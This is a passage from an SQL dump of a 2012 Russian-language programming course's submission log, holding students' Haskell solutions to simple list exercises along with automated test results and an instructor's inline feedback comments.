0) \r\n\r\n\r\n\r\n-- extract seq''s of interested length from list\r\n\r\np3 lst = filter ((==) (div (length lst) 2) . length)\r\n\r\n		(foldl p31 [] (zip lst [1..]))\r\n\r\n\r\n\r\n{- folding function, \r\n\r\n - create [[(elem of rising seq, marker -- number in original input seq)]]\r\n\r\n - from lst from prev ste \r\n\r\n -  and (new elem, it''s number)\r\n\r\n -}\r\n\r\np31 lst (n, m) = [(n, m)] : \r\n\r\n	      lst ++ \r\n\r\n	      map ((:) (n, m)) \r\n\r\n		  (filter ((>) n . fst . head) \r\n\r\n			  lst)\r\n\r\n\r\n\r\n-- find those seq''s which have 0 in ANDing of those bit signatures\r\n\r\n-- have no idea how to generate all-vs-all list of tuples\r\n   --- Я наверное не очень понял вопрос.. Все возможные пары так и герерируются, как вы сделали,\r\n   --- с помощью [(x, y) | x <- l, y <- l]\r\nparts2 lst = let l = p33 (p32 (p3 lst))\r\n\r\n	     in any ( (x, y) -> 0 == x .&. y) [(x, y) | x <- l, y <- l]\r\n   --- Просто как вариант, можно in or [x .&. y | x <- l, y <- l]\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(625, 23, '318210', '2012-09-18 23:21:05', 0, 'seq :: Integer->Integer\r\nisVsPr :: Integer->Integer->Bool\r\n\r\nisVsPr n m | gcd n m == 1 = True\r\n		|otherwise = False\r\n\r\nseq n = seq1 n 1 0\r\n\r\nseq1 n k ans | k > n = ans\r\n		| otherwise = seq1 n (k + 1) (ans + seq2 (n - k) k k 0)\r\n\r\nseq2 n k m ans 	| n == 0 = 1\r\n		| k >= n = ans\r\n		| isVsPr (k + 1) m == False  = seq2 n (k + 1) m ans\r\n		|otherwise = seq2 n (k + 1) m (ans + seq2 (n - k - 1) (k + 1) (m * (k + 1)) 0)', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(626, 23, '318210', '2012-09-18 23:22:09', 1, 'isVsPr n m | gcd n m == 1 = True\r\n		|otherwise = False\r\n   --- Или короче isVsPr n m = gcd n m == 1\r\n\r\n\r\nc n = seq1 n 1 0\r\n\r\nseq1 n k ans | k > n = ans\r\n		| otherwise = seq1 n (k + 1) (ans + seq2 (n - k) k k 0)\r\n\r\nseq2 n k m ans 	| n == 0 = 1\r\n		| k >= n = ans\r\n		| isVsPr (k + 1) m == False  = seq2 n (k + 1) m ans\r\n		|otherwise = seq2 n (k + 1) m (ans + seq2 (n - k - 1) (k + 1) (m * (k + 1)) 0)', '<br/>Тесты успешно пройдены!'),
(627, 30, '1730564', '2012-09-19 07:35:54', 0, 'parts [] = False\r\nparts a = parts'' a (length a) 2\r\n\r\nparts1 [] n k = True\r\nparts1 a n k | (k <= n) = if (mod n k == 0) then isOrderedList (split k a) || parts1 a n (k + 1)\r\n								            else parts1 a n (k + 1)\r\n			 | otherwise = False					\r\n\r\nsplit n [] = []\r\nsplit n a = ((take n a) : (split n (remove n a)))\r\n\r\nremove 0 a = a\r\nremove n [] = []\r\nremove n (head : tail) = remove (n - 1) tail\r\n\r\nisOrdered [] = True\r\nisOrdered (h1 : []) = True\r\nisOrdered (h1 : h2 : tail) | h1 < h2 = isOrdered (h2 : tail)\r\n                           | otherwise = False\r\n						   \r\nisOrderedList [] = True\r\nisOrderedList (head : tail) = isOrdered head && isOrderedList tail', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(628, 30, '1730564', '2012-09-19 07:38:25', 0, 'parts [] = False\r\nparts a = parts1 a (length a) 2\r\n\r\nparts1 [] n k = True\r\nparts1 a n k | (k <= n) = if (mod n k == 0) then isOrderedList (split k a) || parts1 a n (k + 1)\r\n								            else parts1 a n (k + 1)\r\n			 | otherwise = False					\r\n\r\nsplit n [] = []\r\nsplit n a = ((take n a) : (split n (remove n a)))\r\n\r\nremove 0 a = a\r\nremove n [] = []\r\nremove n (head : tail) = remove (n - 1) tail\r\n\r\nisOrdered [] = True\r\nisOrdered (h1 : []) = True\r\nisOrdered (h1 : h2 : tail) | h1 < h2 = isOrdered (h2 : tail)\r\n                           | otherwise = False\r\n						   \r\nisOrderedList [] = True\r\nisOrderedList (head : tail) = isOrdered head && isOrderedList tail', '<br/>Тесты успешно пройдены!'),
(629, 31, '1730564', '2012-09-19 07:38:58', 1, 'parts [] = False\r\nparts a = parts1 a (length a) 2\r\n\r\nparts1 [] n k = True\r\nparts1 a n k | (k <= n) = if (mod n k == 0) then isOrderedList (split k a) || parts1 a n (k + 1)\r\n								            else parts1 a n (k + 1)\r\n			 | otherwise = False					\r\n\r\nsplit n [] = []\r\nsplit n a = ((take n a) : (split n (remove n a)))\r\n\r\nremove 0 a = a\r\nremove n [] = []\r\nremove n (head : tail) = remove (n - 1) tail\r\n\r\nisOrdered [] = True\r\nisOrdered (h1 : []) = True\r\nisOrdered (h1 : h2 : tail) | h1 < h2 = isOrdered (h2 : tail)\r\n                           | otherwise = False\r\n						   \r\nisOrderedList [] = True\r\nisOrderedList (head : tail) = isOrdered head && isOrderedList tail\r\n   --- OK, очень хорошо, засчитано. Но кстати есть более эффективный алгоритм, \r\n   --- за один проход, мы потом немного про это поговорим.\r\n   --- Еще, просто как замечание, можно последнюю функцию написать так:\r\n   ---    isOrderedList xs = all isOrdered xs\r\n   --- (all - это как any, про которую мы говорили, но проверяет, что условие выполнятся для всех)', '<br/>Тесты успешно пройдены!'),
(630, 25, '532002', '2012-09-19 09:14:01', 1, 'minlist [] = 0\r\n\r\nminlist (x:xs) = minlist1 x xs where\r\n\r\nminlist1 x [] = x\r\n\r\nminlist1 x (y:ys) = minlist1 (min x y) ys\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(631, 25, '533223', '2012-09-19 09:47:56', 1, 'minlist (x:xs) = minlist2 xs x\r\nminlist2 [] y = y\r\nminlist2 (x:xs) y = if x<y\r\n			then minlist2 xs x\r\n		else minlist2 xs y', '<br/>Тесты успешно пройдены!'),
(632, 31, 'tonyo', '2012-09-19 09:54:04', 1, 'parts2_1 [] len1 _ len2 _ _ = (len1 == len2)\r\nparts2_1 (x:xs) len1 max1 len2 max2 listlen =\r\n        (if x > max2 && len2 < halflen then parts2_1 xs len1 max1 (len2+1) x listlen\r\n                                       else False) ||\r\n        (if x > max1 && len1 < halflen then parts2_1 xs (len1+1) x len2 max2 listlen\r\n                                       else False)\r\n            where halflen = div listlen 2\r\n\r\nparts2 list = if len < 2 || mod len 2 /= 0\r\n              then False\r\n              else parts2_1 list 0 (minBound::Int) 0 (minBound::Int) len\r\n                 where len = length list\r\n', '<br/>Тесты успешно пройдены!'),
(633, 27, '533223', '2012-09-19 09:57:10', 1, 'minsum (x:(y:xs)) = minsum2 (y:xs) (x+y)\r\n   --- тут внутренние скобки не нужны: (x:y:ys) - и то же дальше\r\nminsum2 [x] y = y\r\nminsum2 (x:(y:xs)) z = if t<z\r\n			then minsum2 (y:xs) t\r\n		else minsum2 (y:xs) z\r\n		where t = x+y', '<br/>Тесты успешно пройдены!'),
(634, 26, '533223', '2012-09-19 10:06:31', 1, 'rev x = rev2 x []\r\nrev2 [] ys = ys\r\nrev2 (x:xs) ys = rev2 xs (x:ys)', '<br/>Тесты успешно пройдены!'),
(635, 27, '532002', '2012-09-19 10:08:06', 1, 'minsum [] = 0\r\n\r\nminsum (x:y:xs) = minsum1 (x+ y) (y:xs) where\r\n\r\nminsum1 x [] = x\r\n\r\nminsum1 x [y] = x\r\n\r\nminsum1 x (y:z:ys) = minsum1 (min x (y+z)) (z:ys)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(636, 28, '533223', '2012-09-19 10:21:35', 1, 'check cond [] = False\r\ncheck cond (x:xs) = if cond x \r\n			then True\r\n		else check cond xs', '<br/>Тесты успешно пройдены!'),
(637, 31, '787463', '2012-09-19 10:21:42', 2, 'parts2 (x:xs) = parts21 xs x (-1/0) 1 0\r\n\r\nparts21 [] _ _ len1 len2\r\n  | len1 == len2 = True\r\n  | otherwise = False\r\nparts21 (x:xs) min1 min2 len1 len2\r\n  | x > min1 && x > min2 = parts21 xs x min2 (len1 + 1) len2 || parts21 xs min1 x len1 (len2 + 1)\r\n  | x > min1 = parts21 xs x min2 (len1 + 1) len2\r\n  | x > min2 = parts21 xs min1 x len1 (len2 + 1)\r\n  | otherwise = False\r\n     --- ОК, вообще правильно, но давайте я вас попрошу немного оптимизировать - если у нас в одной их частей уже половина от общего количества, то класть туда уже нет смысла. Добавьте такую проверку, пожалуйста.', '<br/>Тесты успешно пройдены!'),
(638, 31, '6774563', '2012-09-19 10:59:15', 2, '-- Просто пересылаю решение на случай, если 17-го числа система отправки через файл еще не работала\r\n\r\n\r\n\r\n-- Очевидное решение - за O( C(n)(n/2) * n ) - слишком много\r\n\r\n-- Мое - за O(n^2). Суть: жадность. Минимальный элемент идет в первый список.\r\n\r\n--  Далее туда идет наименьший из больших него элементов справа от него.\r\n\r\n--  Повторем с новым элементом. И т.д. Оставшиеся элементы - второй список.\r\n   --- Нет, к сожалению так не получится (( Например parts2 [1,6,9,7] у вас выдает False, а дб True\r\n   --- (делится на [1.9] и [6,7]). Сейчас, кстати, добавлю такой тест.\r\n   --- Попробуйте исправить, пожалуйста.\r\n\r\n--    Почему это работает?\r\n\r\n--  Понятно, что минимум должен быть первым в одном из списков\r\n\r\n--  (иначе, искомое разбиение не построить). Все элементы в этом списке должны \r\n\r\n--  далее идти в порядке возрастания поряковых номеров в списке, поэтому поиск только \r\n\r\n--  вправо оправдан. Теперь самое сложное. Почему "прокатывет" жадность?\r\n\r\n--  На каждом шагу мы забираем в этот список наименьшие элементы из возможных.\r\n\r\n--  Интуитивно понятно, что чем ближе к концу элемент, тем, желательно, больше он должен быть.\r\n\r\n--  Т.е. забирая наименьшее из возможных из конца, мы никак не ухудшаем ситуацию, даже наоборот.\r\n\r\n--  Это, понятно, совсем не строгое объяснение, однако проясняет ситуацию. \r\n\r\n--  Как доказать это строго я пока не знаю, но попробую сделать это позже\r\n\r\n--  (на самом деле, даже не на 100% в правильности того, что я пишу, однако все тесты, которые я пок смог\r\n\r\n--  выдумать, прошли, да и выглядит этот метод логичным).\r\n\r\n\r\n\r\n-- Про реализацию: вообще, с деревом отрезков, видимо, решить можно за O(n*log n). Я же реализовал самую\r\n\r\n-- "наивную" версию за квадрат.\r\n\r\n\r\n\r\nmaxInt = 2000000000\r\n\r\nminInt = -2000000000\r\n\r\n\r\n\r\nparts2 [] = True\r\n\r\n-- Есть ли в хаскеле побитовые сдвиги и логические операции с int`ами?\r\n  --- Да, в модуле Data.Bits \r\n  --- См например http://hackage.haskell.org/packages/archive/base/4.6.0.0/doc/html/Data-Bits.html\r\n\r\nparts2 xs | (length xs) `mod` 2 /= 0 = False\r\n\r\nparts2 xs = do\r\n\r\n	let firstPart = rev (getFirstPart ((length xs) `div` 2) minInt xs [])\r\n\r\n	let secondPart = getSecondPart xs firstPart []\r\n\r\n	length firstPart == length secondPart && verifyAscending minInt firstPart && verifyDescending maxInt secondPart \r\n\r\n\r\n\r\ngetFirstPart l curMin initialList firstPart | curMin == maxInt = firstPart\r\n\r\ngetFirstPart l curMin initialList firstPart | length firstPart == l = firstPart\r\n\r\ngetFirstPart l curMin initialList firstPart = do\r\n\r\n	let rightMin = minLimitedWith curMin maxInt initialList\r\n\r\n	getFirstPart l rightMin (clipListTo rightMin initialList) (rightMin:firstPart)\r\n\r\n\r\n\r\ngetSecondPart [] firstPart secondPart = secondPart\r\n\r\ngetSecondPart (x:xs) [] secondPart = getSecondPart xs [] (x:secondPart)\r\n\r\ngetSecondPart (x:xs) (y:ys) secondPart | x == y = getSecondPart xs ys secondPart\r\n\r\ngetSecondPart (x:xs) (y:ys) secondPart = getSecondPart xs (y:ys) (x:secondPart)\r\n\r\n\r\n\r\nverifyAscending last [] = True\r\n\r\nverifyAscending last (x:xs) = (last < x) && verifyAscending x xs\r\n\r\n\r\n\r\nverifyDescending last [] = True\r\n\r\nverifyDescending last (x:xs) = (last > x) && verifyDescending x xs\r\n\r\n\r\n\r\nminLimitedWith limit curMin [] = curMin\r\n\r\nminLimitedWith limit curMin (x:xs) = min3 curMin (limitedNum limit x) (minLimitedWith limit (min curMin (limitedNum limit x)) xs)\r\n\r\n\r\n\r\nclipListTo value [] = []\r\n\r\nclipListTo value (x:xs) | x == value = xs\r\n\r\nclipListTo value (x:xs) = clipListTo value xs\r\n\r\n\r\n\r\nmin3 a b c = min (min a b) c\r\n\r\n\r\n\r\nlimitedNum limit x | x <= limit = maxInt\r\n\r\nlimitedNum limit x = x\r\n\r\n\r\n\r\nrev [] = []\r\n\r\nrev (h:t) = revAcc t [h]\r\n\r\n\r\n\r\nrevAcc [] acc = acc\r\n\r\nrevAcc (h:t) acc = revAcc t (h:acc)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(639, 29, '533223', '2012-09-19 11:24:38', 1, 'checkDifferent xs = cD2 (q xs)\r\ncD2 [x] =True\r\ncD2 (x:(y:xs)) = if x<y \r\n			then cD2 (y:xs)\r\n		else False\r\nq [] = []\r\nq [x] = [x]\r\nq (x:xs) = q2 x xs [] []\r\nq2 t [] ys zs = (q ys) ++ [t]++(q zs)\r\nq2 t (x:xs) ys zs = if (t<x)\r\n				then q2 t xs ys (x:zs)\r\n			else q2 t xs (x:ys) zs', '<br/>Тесты успешно пройдены!'),
(640, 25, 'jamesbrain', '2012-09-19 12:03:54', 1, 'minlist (x:tail) = min1 tail x\r\n\r\nmin1 [] m = m\r\n\r\nmin1 (x:tail) m = if x > m then (min1 tail m) else (min1 tail x)\r\n', '<br/>Тесты успешно пройдены!'),
(641, 27, 'jamesbrain', '2012-09-19 12:04:15', 1, 'minsum (x:y:tail) = minsum1 tail (x+y) y\r\n\r\nminsum1 [] acc center = acc\r\n\r\nminsum1 (x:tail) acc center = if center + x > acc then minsum1 tail acc x else minsum1 tail (center+x) x\r\n', '<br/>Тесты успешно пройдены!'),
(642, 26, 'jamesbrain', '2012-09-19 12:04:33', 1, 'rev x = rev1 x []\r\n\r\nrev1 [] acc = acc\r\n\r\nrev1 (x:tail) acc = rev1 tail (x:acc)\r\n', '<br/>Тесты успешно пройдены!'),
(643, 28, 'jamesbrain', '2012-09-19 12:04:49', 1, 'check cond [] = False\r\n\r\ncheck cond (x:tail) = (cond x) || (check cond tail)\r\n   --- тут справа от = все скобки не нужны: cond x || check cond tail ', '<br/>Тесты успешно пройдены!'),
(644, 30, '1730564', '2012-09-19 12:20:53', 1, 'parts2 [] = True\r\nparts2 a@(head : tail) | mod (length a) 2 == 0 = parts1 tail head (minimum a - 1) (half - 1) half\r\n		    		   | otherwise = False\r\n					   where half = div (length a) 2\r\n\r\nparts1 [] a b 0 0 = True\r\nparts1 (head : tail) a b s1 s2 = if (s1 > 0 && head > a) then parts1 tail head b (s1 - 1) s2 || \r\n															  if (s2 > 0 && head > b) then parts1 tail a head s1 (s2 - 1)\r\n																					  else False\r\n													     else if (s2 > 0 && head > b) then parts1 tail a head s1 (s2 - 1)\r\n														 						      else False', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(645, 25, '985727', '2012-09-19 12:28:54', 0, 'f [x] = x\r\nf x = min (head x) (f(tail x))', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(646, 25, '985727', '2012-09-19 12:28:54', 0, 'f [x] = x\r\nf x = min (head x) (f(tail x))', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(647, 25, '985727', '2012-09-19 12:29:18', 0, 'minlist [x] = x\r\nminlist x = max (head x) (minlist(tail x))', 'Выражение имеет неправильное значение: minlist [3,2,7]'),
(648, 25, '985727', '2012-09-19 12:30:11', 1, 'minlist [x] = x\r\nminlist x = min (head x) (minlist(tail x))', '<br/>Тесты успешно пройдены!'),
(649, 27, '985727', '2012-09-19 12:32:43', 1, 'minsum [x] = x\r\nminsum x = min ((x !! 0) + (x !! 1)) (minsum (tail x))\r\n   --- OK, засчитано, но лучше пользоватся сопоставлением  образцом (как мы завтра разберем), будет эффективнее', '<br/>Тесты успешно пройдены!'),
(650, 29, 'jamesbrain', '2012-09-19 12:33:47', 0, 'import List\r\n\nsimpleComp [] _ = True\r\n\nsimpleComp (x:tail) prev = (x /= prev) && simpleComp tail x\r\n\ncheckDifferent [] = True\r\n\ncheckDifferent (x:tail) = simpleComp (sort tail) x\n', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(651, 29, 'jamesbrain', '2012-09-19 12:34:48', 1, 'import List\r\nsimpleComp [] _ = True\r\nsimpleComp (x:tail) prev = (x /= prev) && simpleComp tail x\r\ncheckDifferent [] = True\r\ncheckDifferent (x:tail) = simpleComp (sort tail) x', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(652, 21, '517309', '2012-09-19 12:38:29', 3, 'nseq n = nseqFrom 1 n\r\n\r\nnseqFrom m n = if m >= n - m \r\n               then 1  -- все\r\n               else nseqFrom (m+1) n +   -- не включаем m\r\n                    nseqFrom (m+1) (n-m)\r\n', '<br/>Тесты успешно пройдены!'),
(653, 26, '985727', '2012-09-19 12:42:03', 1, 'rev1 [] x = x\r\nrev1 x y = rev1 (tail x) (head x : y) \r\nrev x = rev1 x []', '<br/>Тесты успешно пройдены!'),
(654, 26, '532002', '2012-09-19 13:18:52', 1, 'rev [] = []\r\n\r\nrev (x:xs) = rev1 (x:xs) [] where\r\n\r\nrev1 [] ys = ys\r\n\r\nrev1 (x:xs)  ys =  rev1 xs (x:ys) \r\n', '<br/>Тесты успешно пройдены!'),
(655, 22, '533223', '2012-09-19 13:53:53', 1, 'g x = g2 x (primeList x)\r\n\r\ng2 x [y] = False\r\ng2 x (y:ys) = if (inList (x-y) ys)\r\n			then True\r\n			else g2 x ys\r\n\r\nprimeList x = pL2 x [2] 3\r\npL2 x xs y = if (x>y)\r\n		then if (primeCheck xs y)\r\n			then pL2 x (y:xs) (y+1)\r\n			else pL2 x xs (y+1)\r\n		else xs\r\nprimeCheck (x:xs) y = if ((rem y x)==0) \r\n				then False\r\n			else primeCheck xs y\r\nprimeCheck [] y = True\r\n\r\ninList x [] = False\r\ninList x (y:ys) = if (x==y)\r\n			then True\r\n			else inList x ys', '<br/>Тесты успешно пройдены!'),
(656, 34, 'tonyo', '2012-09-19 14:21:49', 1, '#include "stdafx.h"\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 100;\r\n\r\ntemplate <class Func>\r\ndouble integral(Func f, double a, double b)\r\n{\r\n  double res = 0;\r\n  bool changeSign = false;\r\n  if (a > b) \r\n  {\r\n    double t = a;\r\n    a = b;\r\n    b = t;\r\n    changeSign = true;\r\n  }\r\n  double dx = (b-a) / N;\r\n  double xn = a;\r\n  double xn1 = a + dx;\r\n  // trapezoid method\r\n  for (int i = 0; i < N; i++)\r\n  {\r\n    res += 1.0/2 * (f(xn) + f(xn1)) * dx;\r\n    xn += dx;\r\n    xn1 += dx;\r\n  }\r\n  return changeSign ? -res : res;\r\n}\r\n\r\n\r\nint main()\r\n{\r\n  double result;\r\n  result = integral([](double x) { return x*x; }, 0, 1);\r\n  cout << result << "\r\n";\r\n  result = integral([](double x)->double { double y = x*x*x; return y; }, 1, 0);\r\n  cout << result << "\r\n";\r\n\r\n  getchar();\r\n  return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(657, 25, '528420', '2012-09-19 15:53:53', 0, 'minlist [x] = x\r\n\nminlist (x:xs) = min x (minlist xs)\n', '<br/>Тесты успешно пройдены!'),
(658, 25, '528420', '2012-09-19 15:55:50', 1, 'minlist [x] = x\r\nminlist (x:xs) = min x (minlist xs)', '<br/>Тесты успешно пройдены!'),
(659, 27, '528420', '2012-09-19 15:56:06', 1, '-- создаю список из сумм пар элементов, которые\r\n-- стоят подряд в исходном списке\r\npara [a,b] = [a+b]\r\npara (x:xs) = (x + head xs) : para xs\r\n    ---- ОК, хорошая идея (я имею в виду, свести задачу к предыдущей)\r\n\r\n-- ищу минимальный элемент\r\nminlist [x] = x\r\nminlist (x:xs) = min x (minlist xs)\r\n\r\n-- решение\r\nminsum x = minlist (para x)', '<br/>Тесты успешно пройдены!'),
(660, 29, '528420', '2012-09-19 15:56:45', 1, '-- строю множество элементов списка\r\n-- (без повторений) \r\n-- использую функцию elem \r\nsetof [] = []\r\nsetof (x:xs) = if elem x sxs then sxs else x:sxs\r\n               where sxs=setof xs\r\n\r\n-- длина списка\r\nlen [] = 0\r\nlen (x:xs) = 1 + len xs\r\n   --- Тогда уж вы можете использовать и функцию length :)\r\n\r\n-- сравниваю исходный и полученный список по длине\r\ncheckDifferent x = if len x > len (setof x) then False else True\r\n   --- Или короче    checkDifferent x = len x > len (setof x)', '<br/>Тесты успешно пройдены!'),
(661, 26, '528420', '2012-09-19 16:44:50', 0, '--init возвращает список без последнего эл-та\r\nrev [x] = [x]\r\nrev (x) = (last x) : (rev (init x))\r\n', 'Не удалось вычислить выражение "rev []", проверьте правильность синтаксиса'),
(662, 26, '528420', '2012-09-19 16:46:01', 1, '--init возвращает список без последнего эл-та\r\nrev [] = []\r\nrev [x] = [x]\r\nrev (x) = (last x) : (rev (init x))', '<br/>Тесты успешно пройдены!'),
(663, 26, '14561781', '2012-09-19 16:47:34', 1, 'rev xs = revn [] xs\r\n\r\nrevn xs [] = xs\r\n\r\nrevn xs1 (x : xs2) = revn (x : xs1) xs2\r\n   --- В принципе у вас все правильно, не знаю, почему тесты дают ошибку..\r\n\r\n', 'Не удалось вычислить выражение "rev [1,2,3] == [3,2,1]", проверьте правильность синтаксиса'),
(664, 33, 'Deutsche', '2012-09-19 17:04:48', 1, 'This problem was sent by email, accept it please', '<br/>Тесты успешно пройдены!'),
(665, 34, 'Deutsche', '2012-09-19 17:05:07', 1, 'This problem was sent by email, accept it please', '<br/>Тесты успешно пройдены!'),
(666, 28, '528420', '2012-09-19 17:24:06', 0, 'check cond [x] = if (cond x == True) then True else False\r\ncheck cond (x:xs) | (cond x == True) = True\r\n                  | (cond x == False) = check cond xs', 'Не удалось вычислить выражение "check (x->x>5) []", проверьте правильность синтаксиса'),
(667, 28, '528420', '2012-09-19 17:24:55', 1, 'check cond [] = False\r\ncheck cond [x] = if (cond x == True) then True else False\r\n   --- Иди короче check cond [x] = cond x :)\r\n   --- Ведь cond и так возвращает True или False, не надо ни с чем его сравнивать..\r\ncheck cond (x:xs) | (cond x == True) = True\r\n                  | (cond x == False) = check cond xs\r\n   --- И тут тоже примерно так же можно сократить..', '<br/>Тесты успешно пройдены!'),
(668, 31, '787463', '2012-09-19 17:30:15', 1, 'parts2 (x:xs) = parts21 xs x (-1/0) 1 0 (div (length (x:xs)) 2)\r\n\r\nparts21 [] _ _ len1 len2 _\r\n  | len1 == len2 = True\r\n  | otherwise = False\r\n\r\nparts21 (x:xs) min1 min2 len1 len2 maxLen\r\n  | len1 > maxLen || len2 > maxLen = False\r\n  | x > min1 && x > min2 = parts21 xs x min2 (len1 + 1) len2 maxLen || parts21 xs min1 x len1 (len2 + 1) maxLen\r\n  | x > min1 = parts21 xs x min2 (len1 + 1) len2 maxLen\r\n  | x > min2 = parts21 xs min1 x len1 (len2 + 1) maxLen\r\n  | otherwise = False', '<br/>Тесты успешно пройдены!'),
(669, 28, '532002', '2012-09-19 17:41:36', 1, 'check cond [] = False\r\n\r\ncheck cond (x:xs) = if cond x  then True else check cond xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(670, 25, '4169333', '2012-09-19 17:56:48', 1, 'minlist [] =error "empty list!"\r\nminlist (x:xs) =minlist1 x xs\r\nminlist1 m [] =m\r\nminlist1 m (x:xs) \r\n	| x>m =minlist1 m xs\r\n        | x<=m =minlist1 x xs', '<br/>Тесты успешно пройдены!'),
(671, 27, '4169333', '2012-09-19 17:57:17', 1, 'minsum [] =error "empty list!"\r\nminsum (x1:x2:xs) =minsum1 (x1+x2) xs\r\nminsum1 m (x2:[]) =m\r\nminsum1 m (x1:x2:xs) \r\n	| x1+x2>m =minsum1 m (x2:xs)\r\n        | x1+x2<=m =minsum1 (x1+x2) (x2:xs)', '<br/>Тесты успешно пройдены!'),
(672, 26, '4169333', '2012-09-19 17:57:41', 1, 'rev lst =rev1 [] lst\r\nrev1 lst [] =lst\r\nrev1 lst (x:xs) =rev1 (x:lst) xs', '<br/>Тесты успешно пройдены!'),
(673, 29, '532002', '2012-09-19 18:20:19', 1, 'import Data.List (sort)\r\n\r\ncheckDifferent xs = checkDifferent1 (sort xs) where\r\n\r\ncheckDifferent1 [] = True\r\n\r\ncheckDifferent1 [x] = True\r\n\r\ncheckDifferent1 (x:y:xs) = if (x == y) then False else checkDifferent1 (y:xs)\r\n', '<br/>Тесты успешно пройдены!'),
(674, 25, '4748987', '2012-09-19 18:28:57', 0, 'minlist'' n [] = n\r\nminlist'' n (h:t) = minlist (min n h) t\r\nminlist (h:t) = minlist h t ', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(675, 25, '4748987', '2012-09-19 18:31:22', 0, 'inlist'' n [] = n\r\nminlist'' n (h:t) = minlist'' (min n h) t\r\nminlist (h:t) = minlist'' h t ', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(676, 25, '4748987', '2012-09-19 18:33:44', 1, 'minlist'' n [] = n\r\nminlist'' n (h:t) = minlist'' (min n h) t\r\n\r\n\r\nminlist (h:t) = minlist'' h t ', '<br/>Тесты успешно пройдены!'),
(677, 27, '4748987', '2012-09-19 18:34:46', 0, 'minsum'' n [p] = n\r\nminsum'' n (h:t) = minsum'' (min(n h + (head t))) t\r\nminsum (h:t) = minsum'' (h + head(t)) t', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(678, 27, '4748987', '2012-09-19 18:35:30', 0, 'minsum'' n [p] = n\r\nminsum'' n (h:t) = minsum'' (min(n h+head t)) t\r\nminsum (h:t) = minsum'' (h + head(t)) t', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(679, 27, '4748987', '2012-09-19 18:37:27', 0, 'minsum'' n [p] = n\r\nminsum'' n (h:t) = minsum'' (min(n h + head t)) t\r\nminsum (h:t) = minsum'' (h + head t) t', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(680, 27, '4748987', '2012-09-19 18:39:07', 0, 'minsum'' n [p] = n\r\nminsum'' n (h:t) = minsum'' (min(n (h + (head t)))) t\r\nminsum (h:t) = minsum'' (h + (head t)) t', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(681, 25, '51559263', '2012-09-19 18:46:31', 1, 'ml [] min = min\r\nml xs min | head xs < min = ml (tail xs) (head xs)\r\n          | otherwise     = ml (tail xs) (min)\r\n\r\nminlist xs = ml (tail xs) (head xs)', '<br/>Тесты успешно пройдены!'),
(682, 25, '5656962', '2012-09-19 19:05:35', 1, 'minlist (x:[]) = x\r\n\r\nminlist (x:xs) = \r\n\r\n	if x < minlist xs\r\n\r\n	then x\r\n\r\n	else minlist xs\r\n', '<br/>Тесты успешно пройдены!'),
(683, 27, '5656962', '2012-09-19 19:07:01', 1, 'minsum (x:y:[]) = x + y\r\n\r\nminsum (x:y:xs) = \r\n\r\n	if x + y < minsum (y:xs)\r\n\r\n		then x + y\r\n\r\n		else minsum (y:xs)\r\n', '<br/>Тесты успешно пройдены!'),
(684, 26, '5656962', '2012-09-19 19:07:29', 1, 'rev lst = rev2 lst []\r\n\r\nrev2 [] reslst = reslst\r\n\r\nrev2 (x:xs) reslst = rev2 xs (x:reslst)\r\n', '<br/>Тесты успешно пройдены!'),
(685, 26, '5656962', '2012-09-19 19:07:29', 1, 'rev lst = rev2 lst []\r\n\r\nrev2 [] reslst = reslst\r\n\r\nrev2 (x:xs) reslst = rev2 xs (x:reslst)\r\n', '<br/>Тесты успешно пройдены!'),
(686, 22, '442421', '2012-09-19 19:07:37', 1, 'g n = g'' 2 (n-2)\r\n\r\ng'' a b = if a>=b \r\n	then False\r\n	else if p a && p b \r\n		then True\r\n		else g'' (a+1) (b-1)\r\n\r\np 1 = False\r\np 2 = True\r\np n = d n 2\r\nd n x = if x > div n 2 \r\n   --- тут лучше написать x*x > n\r\n	then True\r\n	else if mod n x == 0\r\n		then False\r\n		else d n (x+1)\r\n		', '<br/>Тесты успешно пройдены!'),
(687, 25, '442421', '2012-09-19 19:14:54', 1, 'minlist (x:xs) = minlist'' x xs\r\n\r\nminlist'' x [] = x\r\n\r\nminlist'' y (x:xs) = if x<y\r\n			then minlist'' x xs\r\n			else minlist'' y xs\r\n', '<br/>Тесты успешно пройдены!'),
(688, 28, '4169333', '2012-09-19 19:15:20', 1, 'check cond [] =False\r\ncheck cond (x:xs) =cond x || check cond xs', '<br/>Тесты успешно пройдены!'),
(689, 27, '4748987', '2012-09-19 19:22:29', 0, 'minsum'' n [p] = n\r\nminsum'' n (h:t) = minsum'' (min(n h + (head t))) t\r\nminsum (h:t) = minsum'' (h + head t)) t', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(690, 27, '442421', '2012-09-19 19:23:59', 1, 'minsum (x:xs) = minsum1 x xs\r\n\r\nminsum1 a (b:[]) = a+b\r\n\r\nminsum1 a (b:bs) = minsum11 (a+b) b bs\r\n\r\nminsum11 s a (b:[]) = if s>a+b \r\n			then a+b\r\n			else s\r\n\r\nminsum11 s a (b:bs) = if s>a+b\r\n			then minsum11 (a+b) b bs\r\n			else minsum11 s b bs\r\n', '<br/>Тесты успешно пройдены!'),
